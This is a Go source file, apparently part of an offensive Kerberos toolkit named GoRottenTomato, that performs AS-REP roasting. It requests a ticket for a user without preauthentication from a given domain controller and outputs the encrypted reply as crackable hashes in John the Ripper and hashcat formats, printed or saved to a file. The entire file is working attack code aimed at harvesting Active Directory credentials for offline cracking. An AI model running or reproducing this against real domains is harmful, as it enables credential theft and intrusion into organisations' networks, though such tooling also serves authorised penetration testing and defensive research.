package module

import (
	"GoRottenTomato/krb5/AskTGT"
	"fmt"
	"io/ioutil"
)

func AS_REPRoast(domain, dcIP, username, path, format string, eType int32) error {
	asrep, err := AskTGT.AskTGT(domain, username, "", dcIP, "", false, eType)
	if err != nil {
		return fmt.Errorf("[-]AS-REP failed! \n%v", err)
	}

	john := fmt.Sprintf("$krb5asrep$%s@%s:%x$%x", asrep.KDC_REP.CName.Name_String[0], asrep.KDC_REP.CRealm, asrep.KDC_REP.Enc_Part.Cipher[0:16], asrep.KDC_REP.Enc_Part.Cipher[16:])
	hashcat := fmt.Sprintf("$krb5asrep$%d$%s@%s:%x$%x", asrep.KDC_REP.Enc_Part.EType, asrep.CName.Name_String[0], asrep.KDC_REP.CRealm, asrep.KDC_REP.Enc_Part.Cipher[0:16], asrep.KDC_REP.Enc_Part.Cipher[16:])

	fmt.Printf("[+]AS-REQ preauth successful!\n")

	if path != "" {
		data := username + "/" + domain + "\n" + "john:" + "\n" + john + "\n\n" + "hashcat:" +"\n" + hashcat + "\n\n"
		err = ioutil.WriteFile(path, []byte(data), 0644)
		if err != nil {
			return fmt.Errorf("[-]can not save %s: %v", path, err)
		}
		fmt.Printf("[+]Save %s Sucessful!\n", path)
		return nil
	}

	var hash string
	switch format {
	case "john":
		hash = fmt.Sprintf("[*]AS-REP hash(john):\n\n%s", john)
	case "hashcat":
		hash = fmt.Sprintf("[*]AS-REP hash(hashcat):\n\n%s", hashcat)
	default:
		hash = fmt.Sprintf("[*]AS-REP hash(john):\n\n%s", john)
	}
	fmt.Println(hash)
	return nil
}
